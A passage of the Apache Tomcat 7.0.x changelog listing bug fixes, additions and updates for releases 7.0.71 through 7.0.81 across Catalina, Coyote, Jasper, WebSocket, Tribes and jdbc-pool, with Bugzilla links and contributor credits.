application. (markt) | | fix | Fix random `SocketTimeoutException`s when reading the request `InputStream`. Based on a patch by Peter Major. (markt) | | fix | [60900](https://bz.apache.org/bugzilla/show_bug.cgi?id=60900): Avoid a `NullPointerException` in the APR Poller if a connection is closed at the same time as new data arrives on that connection. (markt) | | add | Add an option to reject requests that contain HTTP headers with invalid (non-token) header names with a 400 response. (markt) | |  | **WebSocket** | | --- | | | fix | [61491](https://bz.apache.org/bugzilla/show_bug.cgi?id=61491): When using the `permessage-deflate` extension, correctly handle the sending of empty messages after non-empty messages to avoid the `IllegalArgumentException`. (markt) | | --- | --- | |  | **Tribes** | | --- | | | fix | To avoid unexpected session timeout notification from backup session, update the access time when receiving the map member notification message. (kfujino) | | --- | --- | | fix | Add member info to the log message when the failure detection check fails in `TcpFailureDetector`. (kfujino) | | fix | Avoid Ping timeout until the added map member by receiving `MSG_START` message is completely started. (kfujino) | | fix | When sending a channel message, make sure that the Sender has connected. (kfujino) | | fix | Correct the backup node selection logic that node 0 is returned twice consecutively. (kfujino) | | fix | Fix race condition of `responseMap` in `RpcChannel`. (kfujino) | |  | **jdbc-pool** | | --- | | | fix | [61391](https://bz.apache.org/bugzilla/show_bug.cgi?id=61391): Ensure that failed queries are logged if the `SlowQueryReport` interceptor is configured to do so and the connection has been abandoned. Patch provided by Craig Webb. (markt) | | --- | --- | | fix | [61425](https://bz.apache.org/bugzilla/show_bug.cgi?id=61425): Ensure that transaction of idle connection has terminated when the `testWhileIdle` is set to `true` and `defaultAutoCommit` is set to `false`. Patch provided by WangZheng. (kfujino) | | fix | [61545](https://bz.apache.org/bugzilla/show_bug.cgi?id=61545): Correctly handle invocations of methods defined in the `PooledConnection` interface when using pooled XA connections. Patch provided by Nils Winkler. (markt) | |  | **Other** | | --- | | | fix | [61439](https://bz.apache.org/bugzilla/show_bug.cgi?id=61439): Remove the Java Annotation API classes from tomcat-embed-core.jar and package them in a separate JAR in the embedded distribution to provide end users with greater flexibility to handle potential conflicts with the JRE and/or other JARs. (markt) | | --- | --- | | fix | [61441](https://bz.apache.org/bugzilla/show_bug.cgi?id=61441): Improve the detection of `JAVA_HOME` by the `daemon.sh` script when running on a platform where Java has been installed from an RPM. (rjung) | | update | Update the packaged version of the Tomcat Native Library to 1.2.14 to pick up the latest Windows binaries built with APR 1.6.2 and OpenSSL 1.0.2l. (markt) | | fix | Update fix for [59904](https://bz.apache.org/bugzilla/show_bug.cgi?id=59904) so that values less than zero are accepted instead of throwing a NegativeArraySizeException. (remm) | | fix | [61563](https://bz.apache.org/bugzilla/show_bug.cgi?id=61563): Correct typos in Spanish translation. Patch provided by Gonzalo Vásquez. (csutherl) | | | |  | **Tomcat 7.0.81 (violetagg)** | **released 2017-08-16** | | --- | --- | | | **Catalina** | | --- | | | fix | Correct regression in 7.0.80 that broke WebDAV. (markt) | | --- | --- | | | |  | **Tomcat 7.0.80 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [56785](https://bz.apache.org/bugzilla/show_bug.cgi?id=56785): Avoid `NullPointerException` if directory exists on the class path that is not readable by the Tomcat user. (markt) | | --- | --- | | fix | Additional permission for deleting files is granted to JULI as it is required by FileHandler when running under a Security Manager. The thread that cleans the log files is marked as daemon thread. (violetagg) | | fix | [61229](https://bz.apache.org/bugzilla/show_bug.cgi?id=61229): Correct a regression in 7.0.78 that broke WebDAV handling for resources with names that included a `&` character. (markt) | | add | If the `Content-Language` HTTP header is set directly, attempt to determine the Locale from the header value and call `ServletResponse.setLocale()` with the derived Locale. (markt) | | fix | [61232](https://bz.apache.org/bugzilla/show_bug.cgi?id=61232): When log rotation is disabled only one separator will be used when generating the log file name. For example if the prefix is `catalina.` and the suffix is `.log` then the log file name will be `catalina.log` instead of `catalina..log`. Patch provided by Katya Stoycheva. (violetagg) | | fix | [61253](https://bz.apache.org/bugzilla/show_bug.cgi?id=61253): Add warn message when Digester.updateAttributes throws an exception instead of ignoring it. (csutherl) | | fix | [61313](https://bz.apache.org/bugzilla/show_bug.cgi?id=61313): Make the read timeout configurable in the `JNDIRealm` and ensure that a read timeout will result in an attempt to fail over to the alternateURL. Based on patches by Peter Maloney and Felix Schumacher. (markt) | |  | **Coyote** | | --- | | | fix | [61086](https://bz.apache.org/bugzilla/show_bug.cgi?id=61086): Ensure to explicitly signal an empty request body for HTTP 205 responses. Additional fix to r1795278. Based on a patch provided by Alexandr Saperov. (violetagg) | | --- | --- | | fix | [61322](https://bz.apache.org/bugzilla/show_bug.cgi?id=61322): Correct two regressions caused by the fix for [60319](https://bz.apache.org/bugzilla/show_bug.cgi?id=60319) when using BIO with an external Executor. Firstly, use the `maxThreads` setting from the Executor as the default for `maxConnections` if none is specified. Secondly, use `maxThreads` from the Executor when calculating the point at which to disable keep-alive. (markt) | | add | Add additional logging to record problems that occur while waiting for the NIO pollers to stop during the Connector stop process. (markt) | | fix | Prevent exceptions being thrown during normal shutdown of NIO connections. This enables TLS connections to close cleanly. (markt) | |  | **Jasper** | | --- | | | add | [53031](https://bz.apache.org/bugzilla/show_bug.cgi?id=53031): Add support for the `fork` option when compiling JSPs with the Jasper Ant task and javac. (markt) | | --- | --- | |  | **WebSocket** | | --- | | | add | [57767](https://bz.apache.org/bugzilla/show_bug.cgi?id=57767): Add support to the WebSocket client for following redirects when attempting to establish a WebSocket connection. Patch provided by J Fernandez. (markt) | | --- | --- | |  | **Other** | | --- | | | add | [52791](https://bz.apache.org/bugzilla/show_bug.cgi?id=52791): Add the ability to set the defaults used by the Windows installer from a configuration file. Patch provided by Sandra Madden. (markt) | | --- | --- | | | |  | **Tomcat 7.0.79 (violetagg)** | **released 2017-07-01** | | --- | --- | | | **Catalina** | | --- | | | fix | [61101](https://bz.apache.org/bugzilla/show_bug.cgi?id=61101): CORS filter should set Vary header in response. Submitted by Rick Riemer. (remm) | | --- | --- | | add | [61105](https://bz.apache.org/bugzilla/show_bug.cgi?id=61105): Add a new JULI FileHandler configuration for specifying the maximum number of days to keep the log files. (violetagg) | | fix | Improve the `SSLValve` so it is able to handle client certificate headers from Nginx. Based on a patch by Lucas Ventura Carro. (markt) | | fix | [61154](https://bz.apache.org/bugzilla/show_bug.cgi?id=61154): Allow the Manager and Host Manager web applications to start by default when running under a security manager. This was accomplished by adding a custom permission, `org.apache.catalina.security.DeployXmlPermission`, that permits an application to use a `META-INF/context.xml` file and then granting that permission to the Manager and Host Manager. (markt) | | fix | [61173](https://bz.apache.org/bugzilla/show_bug.cgi?id=61173): Polish the javadoc for `o.a.catalina.startup.Tomcat`. Patch provided by peterhansson\_se. (violetagg) | | add | A new configuration property `crawlerIps` is added to the `o.a.catalina.valves.CrawlerSessionManagerValve`. Using this property one can specify a regular expression that will be used to identify crawlers based on their IP address. Based on a patch provided by Tetradeus. (violetagg) | | fix | [61180](https://bz.apache.org/bugzilla/show_bug.cgi?id=61180): Log a warning message rather than an information message if it takes more than 100ms to initialised a `SecureRandom` instance for a web application to use to generate session identifiers. Patch provided by Piotr Chlebda. (markt) | | fix | [61185](https://bz.apache.org/bugzilla/show_bug.cgi?id=61185): When an asynchronous request is dispatched via `AsyncContext.dispatch()` ensure that `getRequestURI()` for the dispatched request matches that of the original request. (markt) | | fix | [61201](https://bz.apache.org/bugzilla/show_bug.cgi?id=61201): Ensure that the `SCRIPT_NAME` environment variable for CGI executables is populated in a consistent way regardless of how the CGI servlet is mapped to a request. (markt) | | fix | [61215](https://bz.apache.org/bugzilla/show_bug.cgi?id=61215): Correctly define `addConnectorPort` and `invalidAuthenticationWhenDeny` in the `mbean-descriptors.xml` file for the `org.apache.catalina.valves` package so that the attributes are accessible via JMX. (markt) | |  | **Coyote** | | --- | | | fix | [61086](https://bz.apache.org/bugzilla/show_bug.cgi?id=61086): Explicitly signal an empty request body for HTTP 205 responses. (markt) | | --- | --- | | fix | Revert a change introduced in the fix for bug [60718](https://bz.apache.org/bugzilla/show_bug.cgi?id=60718) that changed the status code recorded in the access log when the client dropped the connection from 200 to 500. (markt) | | fix | Make asynchronous error handling more robust. In particular ensure that `onError()` is called for any registered `AsyncListener`s after an I/O error on a non-container thread. (markt) | |  | **Jasper** | | --- | | | fix | [44787](https://bz.apache.org/bugzilla/show_bug.cgi?id=44787): Improve error message when JSP compiler configuration options are not valid. (markt) | | --- | --- | |  | **WebSocket** | | --- | | | fix | Correct the log message when a `MessageHandler` for `PongMessage` does not implement `MessageHandler.Whole`. (rjung) | | --- | --- | | fix | Improve thread-safety of `Future`s used to report the result of sending WebSocket messages. (markt) | | fix | [61183](https://bz.apache.org/bugzilla/show_bug.cgi?id=61183): Correct a regression in the previous fix for [58624](https://bz.apache.org/bugzilla/show_bug.cgi?id=58624) that could trigger a deadlock depending on the locking strategy employed by the client code. (markt) | |  | **Web applications** | | --- | | | fix | Better document the meaning of the trimSpaces option for Jasper. (markt) | | --- | --- | | fix | [61150](https://bz.apache.org/bugzilla/show_bug.cgi?id=61150): Configure the Manager and Host-Manager web applications to permit serialization and deserialization of CRSFPreventionFilter related session objects to avoid warning messages and/or stack traces on web application stop and/or start when running under a security manager. (markt) | |  | **Tribes** | | --- | | | add | Add JMX support for Tribes components. (kfujino) | | --- | --- | |  | **Other** | | --- | | | add | [45832](https://bz.apache.org/bugzilla/show_bug.cgi?id=45832): Add HTTP DIGEST authentication support to the Catalina Ant tasks used to communicate with the Manager application. (markt) | | --- | --- | | fix | [45879](https://bz.apache.org/bugzilla/show_bug.cgi?id=45879): Add the `RELEASE-NOTES` file to the root of the installation created by the Tomcat installer for Windows to make it easier for users to identify the installed Tomcat version. (markt) | | fix | [61076](https://bz.apache.org/bugzilla/show_bug.cgi?id=61076): Document the `altDDName` attribute for the `Context` element. (markt) | | fix | [61145](https://bz.apache.org/bugzilla/show_bug.cgi?id=61145): Add missing `@Documented` annotation to annotations in the annotations API. Patch provided by Katya Todorova. (markt) | | fix | [61146](https://bz.apache.org/bugzilla/show_bug.cgi?id=61146): Add missing `lookup()` method to `@EJB` annotation in the annotations API. Patch provided by Katya Todorova. (markt) | | fix | Correct typo in Context Container Configuration Reference. Patch provided by Katya Todorova. (violetagg) | | | |  | **Tomcat 7.0.78 (violetagg)** | **released 2017-05-16** | | --- | --- | | | **General** | | --- | | | add | Allow to exclude JUnit test classes using the build property `test.exclude` and document the property in BUILDING.txt. (rjung) | | --- | --- | |  | **Catalina** | | --- | | | fix | Review those places where Tomcat re-encodes a URI or URI component and ensure that the correct encoding (path differs from query string) is applied and that the encoding is applied consistently. (markt) | | --- | --- | | fix | Use a more reliable mechanism for the `DefaultServlet` when determining if the current request is for custom error page or not. (markt) | | fix | Ensure that when the Default or WebDAV servlets process an error dispatch that the error resource is processed via the `doGet()` method irrespective of the method used for the original request that triggered the error. (markt) | | fix | If a static custom error page is specified that does not exist or cannot be read, ensure that the intended error status is returned rather than a 404. (markt) | | fix | When the WebDAV servlet is configured and an error dispatch is made to a custom error page located below `WEB-INF`, ensure that the target error page is displayed rather than a 404 response. (markt) | | add | [61047](https://bz.apache.org/bugzilla/show_bug.cgi?id=61047): Add MIME mapping for woff2 fonts in the default web.xml. Patch provided by Justin Williamson. (violetagg) | | fix | Correct the logic that selects the encoding to use to decode the query string in the `SSIServletExternalResolver` so that the `useBodyEncodingForURI` attribute of the `Connector` is correctly taken into account. (markt) | | fix | [61072](https://bz.apache.org/bugzilla/show_bug.cgi?id=61072): Respect the documentation statements that allow using the platform default secure random for session id generation. (remm) | | fix | Correct the javadoc for `o.a.c.connector.CoyoteAdapter#parseSessionCookiesId`. Patch provided by John Andrew (XUZHOUWANG) via Github. (violetagg) | |  | **Jasper** | | --- | | | fix | [60925](https://bz.apache.org/bugzilla/show_bug.cgi?id=60925): Improve the handling of access to properties defined by interfaces when a `BeanELResolver` is used under a `SecurityManager`. (markt) | | --- | --- | |  | **WebSocket** | | --- | | | fix | [61003](https://bz.apache.org/bugzilla/show_bug.cgi?id=61003): Ensure the flags for reading/writing in `o.a.t.websocket.AsyncChannelWrapperSecure` are correctly reset even if some exceptions occurred during processing. (markt/violetagg) | | --- | --- | |  | **Web applications** | | --- | | | add | Document the property `test.excludePerformance` in BUILDING.txt. (rjung) | | --- | --- | | add | Add documents for `maxIdleTime` attribute to Channel Receiver docs. (kfujino) | |  | **jdbc-pool** | | --- | | | code | Refactor the creating a constructor for a proxy class to reduce duplicate code. (kfujino) | | --- | --- | | fix | In `StatementFacade`, the method call on the statements that have been closed throw `SQLException` rather than `NullPointerException`. (kfujino) | |  | **Other** | | --- | | | fix | Correct comments about Java 8 in `Jre8Compat`. Patch provided by fibbers via Github. (violetagg) | | --- | --- | | fix | [60932](https://bz.apache.org/bugzilla/show_bug.cgi?id=60932): Correctly escape single quotes when used in i18n messages. Based on a patch by Michael Osipov. (markt) | | | |  | **Tomcat 7.0.77 (violetagg)** | **released 2017-04-02** | | --- | --- | | | **Catalina** | | --- | | | add | [54618](https://bz.apache.org/bugzilla/show_bug.cgi?id=54618): Add support to the `HttpHeaderSecurityFilter` for the HSTS preload parameter. (markt) | | --- | --- | | fix | [60911](https://bz.apache.org/bugzilla/show_bug.cgi?id=60911): Ensure NPE will not be thrown when looking for SSL session ID. Based on a patch by Didier Gutacker. (violetagg) | |  | **Coyote** | | --- | | | fix | When using the NIO2 connector, ensure a WebSocket close frame is processed before the end of stream is processed to ensure that the end of stream is processed correctly. (markt) | | --- | --- | | fix | [60852](https://bz.apache.org/bugzilla/show_bug.cgi?id=60852): Correctly spell compressible when used in configuration attributes and internal code. Based on a patch by Michael Osipov. (markt) | | fix | Improve sendfile handling when requests are pipelined. (markt) | |  | **Jasper** | | --- | | | fix | Improve the error handling for simple tags to ensure that the tag is released and destroyed once used. (remm, violetagg) | | --- | --- | | fix | [60844](https://bz.apache.org/bugzilla/show_bug.cgi?id=60844): Correctly handle the error when fewer parameter values than required by the method are used to invoke an EL method expression. Patch provided by Daniel Gray. (markt) | |  | **jdbc-pool** | | --- | | | fix | [60764](https://bz.apache.org/bugzilla/show_bug.cgi?id=60764): Implement `equals()` and `hashCode()` in the `StatementFacade` in order to enable these methods to be called on the closed statements if any statement proxy is set. This behavior can be changed with `useStatementFacade` attribute. (kfujino) | | --- | --- | | | |  | **Tomcat 7.0.76 (markt)** | **released 2017-03-16** | | --- | --- | | | **Catalina** | | --- | | | code | Make it easier for sub-classes of `Tomcat` to modify the default web.xml settings by over-riding `getDefaultWebXmlListener()`. Patch provided by Aaron Anderson. (markt) | | --- | --- | | fix | Reduce the contention in the default `InstanceManager` implementation when multiple threads are managing objects and need to reference the annotation cache. (markt) | | code | [60674](https://bz.apache.org/bugzilla/show_bug.cgi?id=60674): Remove `final` marker from `CorsFilter` to enable sub-classing. (markt) | | fix | [60683](https://bz.apache.org/bugzilla/show_bug.cgi?id=60683): Security manager failure causing NPEs when doing IO on some JVMs. (csutherl) | | fix | [60688](https://bz.apache.org/bugzilla/show_bug.cgi?id=60688): Update the internal fork of Apache Commons BCEL to r1782855 to add early access Java 9 support to the annotation scanning code. (markt) | | fix | [60718](https://bz.apache.org/bugzilla/show_bug.cgi?id=60718): Improve error handling for asynchronous processing and correct a number of cases where the `requestDestroyed()` event was not being fired and an entry wasn't being made in the access logs. (markt) | | fix | [60808](https://bz.apache.org/bugzilla/show_bug.cgi?id=60808): Ensure that the `Map` returned by `ServletRequest.getParameterMap()` is fully immutable. Based on a patch provided by woosan. (markt) | | fix | [60824](https://bz.apache.org/bugzilla/show_bug.cgi?id=60824): Correctly cache the `Subject` in the session - if there is a session - when running under a `SecurityManager`. Patch provided by Jan Engehausen. (markt) | | fix | Ensure request and response facades are used when firing application listeners. (markt/remm) | | fix | When HTTP TRACE requests are disabled on the Connector, ensure that the HTTP OPTIONS response from the WebDAV servlet does not include TRACE in the returned Allow header. (markt) | |  | **Coyote** | | --- | | | fix | Ensure that executor thread pools used with connectors pre-start the configured minimum number of idle threads. (markt) | | --- | --- | | add | [60594](https://bz.apache.org/bugzilla/show_bug.cgi?id=60594): Allow some invalid characters that were recently restricted to be processed in requests by using the system property `tomcat.util.http.parser.HttpParser.requestTargetAllow`. (csutherl) | |  | **Jasper** | | --- | | | fix | Refactor code generated for JSPs to reduce the size of the code required for tags. (markt) | | --- | --- | |  | **Cluster** | | --- | | | add | Make the `accessTimeout` configurable in `ClusterSingleSignOn`. The `accessTimeout` is used as a timeout period for PING in replication map. (kfujino) | | --- | --- | | fix | [60806](https://bz.apache.org/bugzilla/show_bug.cgi?id=60806): To avoid `ClassNotFoundException`, make sure that the web application class loader is passed to `ReplicatedContext`. (kfujino) | |  | **WebSocket** | | --- | | | fix | [60617](https://bz.apache.org/bugzilla/show_bug.cgi?id=60617): Correctly create a `CONNECT` request when establishing a WebSocket connection via a proxy. Patch provided by Svetlin Zarev. (markt) | | --- | --- | |  | **Tribes** | | --- | | | fix | Ensure that `NoRpcChannelReply` messages are not received on `RpcCallback`. (kfujino) | | --- | --- | | fix | [60722](https://bz.apache.org/bugzilla/show_bug.cgi?id=60722): Take account of the **dispatchersUseEncodedPaths** setting on the current **Context** when generating paths for dispatches triggered by `AsyncContext.dispatch()`. (markt) | |  | **Other** | | --- | | | fix | [60620](https://bz.apache.org/bugzilla/show_bug.cgi?id=60620): Fix configuration of Eclipse projects, broken by introduction of `SafeForkJoinWorkerThreadFactory` helper class. This class cannot be built with Java 6. (kkolinko) | | --- | --- | | update | Update the packaged version of the Tomcat Native Library to 1.2.12 to pick up the latest Windows binaries built with OpenSSL 1.0.2k. (violetagg) | | add | [60784](https://bz.apache.org/bugzilla/show_bug.cgi?id=60784): Update all unit tests that test the HTTP status line to check for the required space after the status code. Patch provided by Michael Osipov. (markt) | | update | Update the NSIS Installer used to build the Windows installer to version 3.01. (markt) | | fix | Refactor the build script and the NSIS installer script so that either NSIS 2.x or NSIS 3.x can be used to build the installer. This is primarily to re-enable building the installer on the Linux based CI system where the combination of NSIS 3.x and wine leads to failed installer builds. (markt) | | | |  | **Tomcat 7.0.75 (violetagg)** | **released 2017-01-24** | | --- | --- | | | **Cluster** | | --- | | | add | Make the `accessTimeout` configurable in `BackupManager`. The `accessTimeout` is used as a timeout period for PING in replication map. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | Ensure the ASF logo image is correctly displayed in docs and host-manager applications. (violetagg) | | --- | --- | | | |  | **Tomcat 7.0.74 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [53602](https://bz.apache.org/bugzilla/show_bug.cgi?id=53602): Add HTTP status code 451 (RFC 7725) to the list of HTTP status codes recognised by Tomcat. (markt) | | --- | --- | | fix | Correctly handle the `configClass` attribute of a Host when embedding Tomcat. (markt) | | fix | [60379](https://bz.apache.org/bugzilla/show_bug.cgi?id=60379): Dispose of the GSS credential once it is no longer required. Patch provided by Michael Osipov. (markt) | | fix | [60380](https://bz.apache.org/bugzilla/show_bug.cgi?id=60380): Ensure that a call to `HttpServletRequest#logout()` triggers a call to `TomcatPrincipal#logout()`. Based on a patch by Michael Osipov. (markt) | | fix | [60387](https://bz.apache.org/bugzilla/show_bug.cgi?id=60387): Correct the javadoc for `o.a.catalina.AccessLog.setRequestAttributesEnabled`. The default value is different for the different implementations. (violetagg) | | code | [60393](https://bz.apache.org/bugzilla/show_bug.cgi?id=60393): Use consistent parameter naming in implementations of `Realm#authenticate(GSSContext, boolean)`. (markt) | | fix | [60395](https://bz.apache.org/bugzilla/show_bug.cgi?id=60395): Log when an `Authenticator` passes an incomplete `GSSContext` to a Realm since it indicates a bug in the `Authenticator`. Patch provided by Michael Osipov. (markt) | | update | Update the warnings that reference required options for running on Java 9 to use the latest syntax for those options. (markt) | | fix | [60513](https://bz.apache.org/bugzilla/show_bug.cgi?id=60513): Fix thread safety issue with RMI cleanup code. (remm) | | add | [60620](https://bz.apache.org/bugzilla/show_bug.cgi?id=60620): Extend the `JreMemoryLeakPreventionListener` to provide protection against `ForkJoinPool.commonPool()` related memory leaks. (markt) | |  | **Coyote** | | --- | | | fix | Ensure that the endpoint is able to unlock the acceptor thread during shutdown if the endpoint is configured to listen to any local address of a specific type such as `0.0.0.0` or `::`. (markt) | | --- | --- | | fix | Ensure sendfile is enabled by default for APR. (markt) | | fix | Prevent read time out when the file is deleted while serving the response. The issue was observed only with APR Connector and sendfile enabled. (violetagg) | | fix | Improve the logic that selects an address to use to unlock the Acceptor to take account of platforms what do not listen on all local addresses when configured with an address of `0.0.0.0` or `::`. (markt) | | fix | [60409](https://bz.apache.org/bugzilla/show_bug.cgi?id=60409): When unable to complete sendfile request, ensure the Processor will be added to the cache only once. (markt/violetagg) | |  | **Jasper** | | --- | | | add | [44294](https://bz.apache.org/bugzilla/show_bug.cgi?id=44294): Add support for varargs in UEL expressions. (markt) | | --- | --- | | fix | [60356](https://bz.apache.org/bugzilla/show_bug.cgi?id=60356): Fix pre-compilation of JSPs that depend on nested tag files packaged in a JAR. (markt) | | fix | [60431](https://bz.apache.org/bugzilla/show_bug.cgi?id=60431): Improve handling of varargs in UEL expressions. Based on a patch by Ben Wolfe. (markt) | | fix | [60497](https://bz.apache.org/bugzilla/show_bug.cgi?id=60497): Restore previous tag reuse behavior following the use of try/finally. (remm) | | fix | Improve the error handling for simple tags to ensure that the tag is released and destroyed once used. (remm) | | fix | [60497](https://bz.apache.org/bugzilla/show_bug.cgi?id=60497): Follow up fix using a better variable name for the tag reuse flag. (remm) | | fix | Revert use of try/finally for simple tags. (remm) | |  | **Web applications** | | --- | | | fix | Correct a typo in Host Configuration Reference. Issue reported via comments.apache.org. (violetagg) | | --- | --- | | add | In the documentation web application, be explicit that clustering requires a secure network for all of the cluster network traffic. (markt) | | update | Update the ASF logos to the new versions. | |  | **Tribes** | | --- | | | fix | Reduce the warning logs for a message received from a different domain in order to avoid excessive log outputs. (kfujino) | | --- | --- | | add | Add log message that PING message has received beyond the timeout period. (kfujino) | | fix | When a PING message that beyond the time-out period has been received, make sure that valid member is added to the map membership. (kfujino) | |  | **WebSocket** | | --- | | | fix | [60437](https://bz.apache.org/bugzilla/show_bug.cgi?id=60437): Avoid possible handshake overflows in the websocket client. (remm) | | --- | --- | |  | **jdbc-pool** | | --- | | | add | [58816](https://bz.apache.org/bugzilla/show_bug.cgi?id=58816): Implement the statistics of jdbc-pool. The stats infos are `borrowedCount`, `returnedCount`, `createdCount`, `releasedCount`, `reconnectedCount`, `releasedIdleCount` and `removeAbandonedCount`. (kfujino) | | --- | --- | | fix | [60194](https://bz.apache.org/bugzilla/show_bug.cgi?id=60194): If `validationQuery` is not specified, connection validation is done by calling the `isValid()` method. (kfujino) | | fix | [60398](https://bz.apache.org/bugzilla/show_bug.cgi?id=60398): Fix testcase of `TestSlowQueryReport`. (kfujino) | | add | Enable reset the statistics without restarting the pool. (kfujino) | |  | **Other** | | --- | | | fix | [60366](https://bz.apache.org/bugzilla/show_bug.cgi?id=60366): Change `catalina.bat` to use directly `LOGGING_MANAGER` and `LOGGING_CONFIG` variables in order to configure logging, instead of modifying `JAVA_OPTS`. Patch provided by Petter Isberg. (violetagg) | | --- | --- | | add | New property is added `test.verbose` in order to control whether the output of the tests is displayed on the console or not. Patch provided by Emmanuel Bourg. (violetagg) | | update | Update the ASF logos used in the Apache Tomcat installer for Windows to use the new versions. | | fix | Spelling corrections provided by Josh Soref. (violetagg) | | | |  | **Tomcat 7.0.73 (violetagg)** | **released 2016-11-14** | | --- | --- | | | **Catalina** | | --- | | | fix | [60117](https://bz.apache.org/bugzilla/show_bug.cgi?id=60117): Ensure that the name of `LogLevel` is localized when using `OneLineFormatter`. Patch provided by Tatsuya Bessho. (kfujino) | | --- | --- | | add | [60151](https://bz.apache.org/bugzilla/show_bug.cgi?id=60151): Improve the exception error messages when a `ResourceLink` fails to specify the type, specifies an unknown type or specifies the wrong type. (markt) | | fix | [60167](https://bz.apache.org/bugzilla/show_bug.cgi?id=60167): Ignore empty lines in `/etc/passwd` files when using the `PasswdUserDatabase`. (markt) | | fix | Improve the access checks for linked global resources to handle the case where the current class loader is a child of the web application class loader. (markt) | | fix | [60199](https://bz.apache.org/bugzilla/show_bug.cgi?id=60199): Log a warning if deserialization issues prevent a session attribute from being loaded. (markt) | | fix | Correctly test for control characters when reading the provided shutdown password. (markt) | | fix | When configuring the JMX remote listener, specify the allowed types for the credentials. (markt) | |  | **Coyote** | | --- | | | fix | [60123](https://bz.apache.org/bugzilla/show_bug.cgi?id=60123): Avoid potential threading issues that could cause excessively large vales to be returned for the processing time of a current request. (markt) | | --- | --- | | fix | [60174](https://bz.apache.org/bugzilla/show_bug.cgi?id=60174): Log instances of `HeadersTooLargeException` during request processing. (markt) | | fix | Correct the HTTP header parser so that DEL is not treated as a valid token character. (markt) | | fix | [60319](https://bz.apache.org/bugzilla/show_bug.cgi?id=60319): When using an Executor, disconnect it from the Connector attributes `maxThreads`, `minSpareThreads` and `threadPriority` to enable the configuration settings to be consistently reported. These Connector attributes will be reported as `-1` when an Executor is in use. The values used by the executor may be set and obtained via the Executor. (markt) | | fix | If an I/O error occurs during async processing on a non-container thread, ensure that the `onError()` event is triggered. (markt) | | fix | Improve detection of I/O errors during async processing on non-container threads and trigger async error handling when they are detected. (markt) | | add | Add additional checks for valid characters to the HTTP request line parsing so invalid request lines are rejected sooner. (markt) | |  | **Web applications** | | --- | | | add | Add an example of using the `classesToInitialize` attribute of the `JreMemoryLeakPreventionListener` to the documentation web application. Based on a patch by Cris Berneburg. (markt) | | --- | --- | | fix | [60192](https://bz.apache.org/bugzilla/show_bug.cgi?id=60192): Correct a typo in the status output of the Manager application. Patch provided by Radhakrishna Pemmasani. (markt) | | fix | Correct a typo in HTTP Connector How-To. Issue reported via comments.apache.org. (violetagg) | | fix | Fix default value of `validationInterval` attribute in jdbc-pool. (kfujino) | | fix | Correct a typo in CGI How-To. Issue reported via comments.apache.org. (violetagg) | | fix | [60344](https://bz.apache.org/bugzilla/show_bug.cgi?id=60344): Add a note to BUILDING.txt regarding using the source bundle with the correct line endings. (markt) | |  | **Tribes** | | --- | | | fix | When the proxy node sends a backup retrieve message, ensure that using the `channelSendOptions` that has been set rather than the default `channelSendOptions`. (kfujino) | | --- | --- | |  | **jdbc-pool** | | --- | | | fix | [60099](https://bz.apache.org/bugzilla/show_bug.cgi?id=60099): Ensure that use all method arguments as a cache key when using `StatementCache`. (kfujino) | | --- | --- | | fix | [60139](https://bz.apache.org/bugzilla/show_bug.cgi?id=60139): Correct Javadocs for `PoolConfiguration.getValidationInterval` and `setValidationInterval`. Reported by Phillip Webb. (kfujino) | |  | **Other** | | --- | | | add | Add documentation to the bin/catalina.bat script to remind users that environment variables don't affect the configuration of Tomcat when run as a Windows Service. Based upon a documentation patch by James H.H. Lampert. (schultz) | | --- | --- | | | |  | **Tomcat 7.0.72 (violetagg)** | **released 2016-09-19** | | --- | --- | | | **Catalina** | | --- | | | fix | Ensure `Digester.useContextClassLoader` is considered in case the class loader is used. (violetagg) | | --- | --- | |  | **Jasper** | | --- | | | fix | [60101](https://bz.apache.org/bugzilla/show_bug.cgi?id=60101): Remove preloading of the class that was deleted. (violetagg) | | --- | --- | |  | **jdbc-pool** | | --- | | | fix | Notify jmx when returning the connection that has been marked suspect. (kfujino) | | --- | --- | | fix | Ensure that the `POOL_EMPTY` notification has been added to the jmx notification types. (kfujino) | |  | **Other** | | --- | | | update | Update the packaged version of the Tomcat Native Library to 1.2.10 to pick up the latest Windows binaries built with OpenSSL 1.0.2j. (markt) | | --- | --- | | update | [61599](https://bz.apache.org/bugzilla/show_bug.cgi?id=61599): Update to Commons Daemon 1.1.0 for improved Java 9 support. (markt) | | | |  | **Tomcat 7.0.71 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [57705](https://bz.apache.org/bugzilla/show_bug.cgi?id=57705): Add debug logging for requests denied by the remote host and remote address valves and filters. Based on a patch by Graham Leggett. (markt) | | --- | --- | | update | Change the default of the `sessionCookiePathUsesTrailingSlash` attribute of the `Context` element to `false` since the problems caused when a Servlet is mapped to `/*` are more significant than the security risk of not enabling this option by default. (markt) | | fix | [59708](https://bz.apache.org/bugzilla/show_bug.cgi?id=59708): Modify the LockOutRealm logic. Valid authentication attempts during the lock out period will no longer reset the lock out timer to zero. (markt) | | fix | Improve error handling around user code prior to calling `InstanceManager.destroy()` to ensure that the method is executed. (markt) | | fix | Ensure that reading the `singleThreadModel` attribute of a `StandardWrapper` via JMX does not trigger initialisation of the associated servlet. With some frameworks this can trigger an unexpected initialisation thread and if initilisation is not thread-safe the initialisation can then fail. (markt) | | fix | By default, treat paths used to obtain a request dispatcher as encoded. This behaviour can be changed per web application via the `dispatchersUseEncodedPaths` attribute of the Context. (markt) | | fix | [59839](https://bz.apache.org/bugzilla/show_bug.cgi?id=59839): Apply `roleSearchAsUser` to all nested searches in JNDIRealm. (fschumacher) | | add | Provide a mechanism that enables the container to check if a component (typically a web application) has been granted a given permission when running under a SecurityManager without the current execution stack having to have passed through the component. Use this new mechanism to extend SecurityManager protection to the system property replacement feature of the digester. (markt) | | add | When retrieving an object via a `ResourceLink`, ensure that the object obtained is of the expected type. (markt) | | fix | [59866](https://bz.apache.org/bugzilla/show_bug.cgi?id=59866): When scanning `WEB-INF/classes` for annotations, don't scan the contents of `WEB-INF/classes/META-INF` (if present) since classes will never be loaded from that location. (markt) | | fix | [59912](https://bz.apache.org/bugzilla/show_bug.cgi?id=59912): Fix an edge case in input stream handling where an `IOException` could be thrown when reading a POST body. (markt) | | fix | [59966](https://bz.apache.org/bugzilla/show_bug.cgi?id=59966): Do not start the web application if the error page configuration in web.xml is invalid. (markt) | | fix | Switch the CGI servlet to the standard logging mechanism and remove support for the debug attribute. (markt) | | add | Add a new initialisation parameter, `envHttpHeaders`, to the CGI Servlet to mitigate 